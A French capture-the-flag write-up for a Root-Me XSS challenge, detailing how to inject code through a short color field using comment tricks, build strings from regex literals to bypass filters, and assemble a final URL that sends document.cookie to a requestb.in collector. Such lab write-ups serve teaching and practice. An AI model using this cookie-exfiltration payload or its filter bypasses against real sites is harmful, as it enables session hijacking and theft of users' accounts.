Bon aller on va se faire un aide mémoire pour plus tard  :-)) 

-D'abord on voit que l'XSS doit être déclenchée uniquement depuis les champs nickname et code couleur du formulaire de contact.
-On voit que ces champs sont passés dans l'url quand on demande si on a de la chance : [->http://challenge01.root-me.org/web-client/ch24/?nickname=lololol&color=1ea&p=game]

-Ensuite un code js supplémentaire est généré avec une partie intéressante :
<code>this.data = {
	"color": "1ea",
	"callbacks": {
		"win": this.youwon,
		"lose": this.youlost
	},
	"seed": "lololol"
};</code>

-Malheureusement, le champ seed est rendu clean (aucun guillemet ne passe, aucune parenthèse, location filtrée (même avec des tricks dans le genre %0c ou %09 au milieu du mot). Ça n'est pas le cas du champ color, mais on n'a le droit qu'à 3 caractères. Après quelques essais on se rend compte qu'il n'y a pas 30000 solutions pour pouvoir exécuter du code arbitraire : mettre "/* dans color. Ça donne "color":""/*. Qu'on termine au niveau de seed pour avoir du code correct : seed=*/,[PAYLOAD],{//   (les commentaires à la fin permettant d'éviter le dernier guillemet qu'on ne peut pas ouvrir puisque filtrés).
<code>this.data = {
	"color": ""/*",
	"callbacks": {
		"win": this.youwon,
		"lose": this.youlost
	},
	"seed": "*/,[PAYLOAD],{//"
};</code>

-Il reste maintenant à trouver un payload fonctionnel sachant qu'on ne peut pas utiliser de parenthèses, ni créer de chaîne, ni utiliser l'attribut location. L'idée est d'utiliser
<code>
if(rng.data.callbacks.lose.toString().length == 205 && rng.try.toString().length == 315)
</code>
en remplaçant la fonction rng.data.callbacks.lose.toString par une fonction au choix. Or on a à disposition la fonction this.try qui, en cas de victoire, redirige automatiquement vers this.url, et c'est possible de gagner facilement si on remplace Math.abs par, par exemple, Math.floor. Si on arrive à faire en sorte que this.url soit un lien de récupération du cookie, c'est gagné.
Pour cela, il faut donc trouver comment créer une chaîne de caractères. Après quelques heures de recherches infructueuses, on tombe sur les regex, qui ne nécéssitent ni parenthèses, ni guillemets, pour être créées. Et on peut accéder à leur contenu avec l'attribut source.
<code>
this.url=/http:\/\/requestb.in\xxxxxxxx?/.source%2Bdocument.cookie
</code>

-Ne reste plus qu'à set les attributs successifs pour data.callbacks.lose et data.callbacks.win, et c'est gagné. Une URL finale : 
[->http://challenge01.root-me.org/web-client/ch24/?nickname=*/},a=this,a.data.callbacks=a,a.lose=a,a.win=a.youwon,a.toString=a.try,a.url=/http:\/\/requestb.in\xxxxxxxx?/.source%2Bdocument.cookie,Math.abs=Math.floor,{//&color=%22/*&p=game]

PS : pour créer des chaînes, c'est possible qu'il y ait d'autres solutions. Au départ, je concaténais des morceaux de this.url, mais ça ne laissait que 7 chars d'url (http:// exclus, mais bon tout le monde n'a pas forcément ce genre de domaine à disposition).
